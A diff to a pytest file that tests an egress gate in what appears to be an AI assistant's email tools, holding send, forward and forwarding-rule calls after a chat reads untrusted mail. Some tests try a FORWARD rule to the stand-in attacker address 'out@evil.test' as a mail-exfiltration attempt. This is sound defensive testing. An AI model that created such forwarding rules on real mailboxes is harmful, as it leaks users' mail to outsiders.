@@ -278,7 +278,13 @@ async def test_a_pack_write_asks_its_own_card_and_never_the_untrusted_card(
     with _run():
         build = await _build("email-setup")
         assert build.held is False
-        await eg.mark_untrusted_answer()  # an email call of this run read mail
+        # Another process marked the chat (Redis holds it, this process does
+        # not), so the call takes the open path, and the gate of the
+        # ORCHESTRATOR would ask the untrusted card.
+        await eg.mark_untrusted_answer()
+        with eg._MARKED_LOCK:
+            eg._MARKED_SESSIONS.clear()
+        assert eg.read_untrusted_answer() is False, "this process holds no mark"
         save = _named(build, "save_knowledge")
         assert ti._is_egress(save), "non-vacuity: an egress tool the gate would hold"
         out = await save(BOX, title="Prices", content="List A")
@@ -632,6 +638,212 @@ async def test_a_pack_tool_acts_only_in_the_run_that_loaded_it() -> None:
     assert ran == []
 
 
+# ── Fix round 1: the scope supplies the held answer (F1) ────────────────────
+
+
+def _held_spies(monkeypatch, module: Any) -> dict[str, list[Any]]:
+    """Spies on the two held-card paths of the email module (§21). Each
+    records its call and sends nothing."""
+    seen: dict[str, list[Any]] = {"new": [], "forward": []}
+
+    async def held_new(*a: Any, **k: Any) -> str:
+        seen["new"].append(k)
+        return "HELD NEW MAIL CARD"
+
+    async def held_forward(*a: Any, **k: Any) -> str:
+        seen["forward"].append(k)
+        return "HELD FORWARD CARD"
+
+    monkeypatch.setattr(module, "_held_new_mail", held_new)
+    monkeypatch.setattr(module, "_held_forward", held_forward)
+    return seen
+
+
+async def test_the_pack_scope_supplies_the_held_answer(monkeypatch) -> None:
+    """The orchestrator's run is open on its own frame. The chat read mail,
+    so the build is held, and only ``owner_scope`` can tell the tool body.
+    Mutation: ``owner_scope`` binds no ``no_egress`` → the body reads an
+    open run, the FORWARD rule saves and ``send_email`` takes the open path
+    → red."""
+    F.flag_on(monkeypatch)
+    module = _module()
+    posts = _mailbox_gateway(monkeypatch, module)
+    seen_held = _held_spies(monkeypatch, module)
+
+    async def card(**_kw: Any) -> bool:
+        return True
+
+    monkeypatch.setattr("acb_skills.ask_tools.request_confirmation", card)
+    monkeypatch.setattr("acb_skills.ask_tools.confirmation_channel_open", lambda: True)
+    inside: dict[str, bool] = {}
+
+    async def body() -> None:
+        inside["no_egress_for_this_run"] = eg.no_egress_for_this_run()
+        inside["module._egress_held"] = module._egress_held()
+
+    with _run():
+        assert eg.no_egress_for_this_run() is False, "non-vacuity: the outer run is open"
+        await eg.mark_untrusted_answer()
+        probe = await _build("email", _stub(_probe(body=body)))
+        assert probe.held is True
+        await _named(probe, "read_email")(email_id="m-1")
+        setup = await _build("email-setup")
+        rule = await _named(setup, "create_rule")(
+            BOX, name="Out", action_type="FORWARD", forward_to="out@evil.test")
+        mail = await _build("email")
+        sent = await _named(mail, "send_email")(BOX, body="hi", to=[F.KNOWN], subject="x")
+    assert inside == {"no_egress_for_this_run": True, "module._egress_held": True}
+    assert rule.startswith("Nothing changed.") and "is off now" in rule, rule
+    assert posts == []
+    assert sent == "HELD NEW MAIL CARD" and len(seen_held["new"]) == 1
+
+
+# ── Fix round 1: a call after the chat read mail in this turn is held (F2) ──
+
+
+@pytest.mark.parametrize("switch", [False, True], ids=["switch-off", "switch-on"])
+async def test_a_call_after_mail_in_the_same_turn_runs_held(monkeypatch, switch: bool) -> None:
+    """Owner choice, STRICT: the build of a clean chat is open, and the
+    first email call reads mail. Each later call of the same turn runs held.
+    With the switch off a forward is refused. With the switch on it goes to
+    the held card. A FORWARD rule is refused either way. Mutation: drop the
+    hold within the turn → the forward takes the open path → red."""
+    (F.flag_on if switch else F.flag_off)(monkeypatch)
+    module = _module()
+    posts = _mailbox_gateway(monkeypatch, module)
+    seen_held = _held_spies(monkeypatch, module)
+    cards: list[Any] = []
+
+    async def card(**kw: Any) -> bool:
+        cards.append(kw)
+        return True
+
+    monkeypatch.setattr("acb_skills.ask_tools.request_confirmation", card)
+    monkeypatch.setattr("acb_skills.ask_tools.confirmation_channel_open", lambda: True)
+    with _run():
+        mail = await _build("email")
+        setup = await _build("email-setup")
+        assert mail.held is False and "forward_email" in {t.__name__ for t in mail.tools}
+        with contextlib.suppress(Exception):
+            await _named(mail, "query_inbox")(query="Navy order")
+        assert eg.read_untrusted_answer() is True, "the first call marked the chat"
+        forward = await _named(mail, "forward_email")(F.MAIL, to=[F.STRANGER])
+        rule = await _named(setup, "create_rule")(
+            BOX, name="Out", action_type="FORWARD", forward_to="out@evil.test")
+    if switch:
+        assert forward == "HELD FORWARD CARD" and len(seen_held["forward"]) == 1
+    else:
+        assert forward == eg.EGRESS_HELD_PACK_ANSWER.format(name="forward_email")
+        assert seen_held["forward"] == []
+    assert rule.startswith("Nothing changed.") and "is off now" in rule, rule
+    assert [p for p, _ in posts if p.startswith("/email/rules")] == []
+    assert cards == [], "a held act asks no open card"
+
+
+async def test_the_first_call_of_a_clean_turn_stays_open(monkeypatch) -> None:
+    """The hold starts after the first email call, not before it. Mutation:
+    read the mark after the call marks the chat → the first call is held."""
+    F.flag_off(monkeypatch)
+    module = _module()
+    seen_held = _held_spies(monkeypatch, module)
+    calls: list[str] = []
+
+    async def post(path: str, body: Any) -> Any:
+        calls.append(path)
+        return {"id": "fwd-1"}
+
+    async def get(path: str, params: Any = None) -> Any:
+        return {"account_id": BOX, "subject": "Quote", "from_address": {"email": F.KNOWN}}
+
+    async def card(**_kw: Any) -> bool:
+        return False  # the member says no, so nothing is sent
+
+    monkeypatch.setattr(module, "_post", post)
+    monkeypatch.setattr(module, "_get", get)
+    monkeypatch.setattr("acb_skills.ask_tools.request_confirmation", card)
+    monkeypatch.setattr("acb_skills.ask_tools.confirmation_channel_open", lambda: True)
+    with _run():
+        mail = await _build("email")
+        out = await _named(mail, "forward_email")(F.MAIL, to=[F.KNOWN])
+    assert "off now" not in out and seen_held["forward"] == [], out
+    assert calls == [], "the member said no to the open card"
+
+
+# ── Fix round 1: the held answer fails closed (item 3) ──────────────────────
+
+
+class _DownRedis:
+    async def exists(self, *_a: Any) -> int:
+        raise ConnectionError("redis down")
+
+    async def expire(self, *_a: Any) -> bool:
+        raise ConnectionError("redis down")
+
+    async def setex(self, *_a: Any) -> bool:
+        raise ConnectionError("redis down")
+
+
+async def test_a_redis_fault_builds_a_held_pack(monkeypatch) -> None:
+    """A delegation reads a fault as no mark. A pack reads it as held.
+    Mutation: read only a KNOWN mark → red."""
+    from acb_common.tenant_redis import TenantRedis
+
+    monkeypatch.setattr(eg, "get_tenant_redis", lambda: TenantRedis(_DownRedis()))
+    with _run(member=""):  # no member: a card cannot show, and it still holds
+        build = await _build("email")
+    assert build.held is True and "send_email" in build.dropped
+
+
+async def test_a_run_with_no_chat_key_builds_a_held_pack() -> None:
+    """No session or no tenant: no mark can be read, so the pack is held.
+    Mutation: drop the ``_session_of`` check → red."""
+    with _run(session_id=None):
+        assert (await _build("email")).held is True
+    with artifact_context_scope():
+        bind_artifact_context(run_id="r-1", session_id=SESSION, agent_name="orchestrator",
+                              no_egress=False)
+        assert (await _build("email")).held is True  # no tenant bound
+
+
+# ── Fix round 1: no run id, no build (item 5) ───────────────────────────────
+
+
+async def test_a_run_with_no_run_id_builds_no_tool() -> None:
+    """The run check of each call keys on ``run_id``. Mutation: build with
+    an empty key, so a call of any frame with no ``run_id`` passes → red."""
+    with _run(run_id=""):
+        build = await _build("email", _stub(_probe()))
+    assert build.tools == () and build.held is True
+
+
+# ── Fix round 1: the held answer of a pack call (item 7) ────────────────────
+
+
+@pytest.mark.parametrize("switch", [False, True], ids=["switch-off", "switch-on"])
+def test_a_pack_call_reads_its_own_held_answer(monkeypatch, switch: bool) -> None:
+    """In a pack turn no other assistant called the run. Mutation: give the
+    pack call the delegation text → "Another assistant" → red."""
+    (F.flag_on if switch else F.flag_off)(monkeypatch)
+    pack_ctx = {"agent_name": EA, eg.PACK_CALL_KEY: True}
+    text = eg.egress_held_answer("forward_email", pack_ctx)
+    want = eg.EGRESS_HELD_PACK_ANSWER_CARDS if switch else eg.EGRESS_HELD_PACK_ANSWER
+    assert text == want.format(name="forward_email")
+    for claim in ("Another assistant", "Email app", "every app", "any app",
+                  "every later turn", "new conversation", "by hand", "search the web"):
+        assert claim not in text, claim
+    delegated = eg.egress_held_answer("forward_email", {"agent_name": EA})
+    assert delegated.startswith("forward_email is off in this run. Another assistant")
+
+
+async def test_the_owner_scope_marks_the_call_as_a_pack_call() -> None:
+    """Mutation: ``owner_scope`` sets no ``PACK_CALL_KEY``."""
+    from acb_skills.tool_packs import owner_scope
+
+    with _run(), owner_scope(EA, True):
+        assert artifact_context().get(eg.PACK_CALL_KEY) is True
+    assert artifact_context().get(eg.PACK_CALL_KEY) is None
+
+
 # ── The working set, the profile writes and the names the run holds ─────────
 
 
@@ -709,6 +921,7 @@ def owner_dir(monkeypatch, tmp_path) -> Any:
     import gateway.routes.agent as routes_agent
 
     monkeypatch.setattr(ti, "_PACK_OWNER_MODULES", {})
+    monkeypatch.setattr(ti, "_PACK_OWNER_FAILED", {})
     entries = [{"name": "probe-owner", "local_path": str(tmp_path)}]
     monkeypatch.setattr(routes_agent, "_AGENT_REGISTRY", entries)
     return tmp_path
@@ -730,6 +943,26 @@ def test_an_owner_that_fails_to_import_is_tried_once(owner_dir) -> None:
     assert ti._pack_owner_module("probe-owner") is None
     assert sk._owner_module("probe-owner") is None
     assert (owner_dir / "imports.txt").read_text(encoding="utf-8") == "x"
+
+
+def test_a_failed_import_is_kept_for_a_window_only(owner_dir, monkeypatch) -> None:
+    """Fix round 1, item 4: a failure is kept for ``PACK_OWNER_RETRY_S``,
+    not until the process restarts, so a fixed owner loads again. Mutation:
+    keep a failure for ever, or never keep one → red."""
+    now = {"t": 1000.0}
+    monkeypatch.setattr(ti, "_pack_clock", lambda: now["t"])
+    _owner_source(owner_dir, "raise RuntimeError('broken owner')")
+    assert ti._pack_owner_module("probe-owner") is None
+    now["t"] += ti.PACK_OWNER_RETRY_S - 1
+    assert ti._pack_owner_module("probe-owner") is None
+    assert (owner_dir / "imports.txt").read_text(encoding="utf-8") == "x"
+    # The fix lands. A comment makes its size differ, so the bytecode cache of
+    # the same second cannot give the old text back.
+    _owner_source(owner_dir, "# fixed in this second\ndef _agent_tools():\n    return []")
+    now["t"] += 2
+    fixed = ti._pack_owner_module("probe-owner")
+    assert fixed is not None and ti._pack_owner_module("probe-owner") is fixed
+    assert ti.PACK_OWNER_RETRY_S == 60.0
 
 
 def test_an_owner_that_exits_at_import_cannot_stop_the_process(owner_dir) -> None:
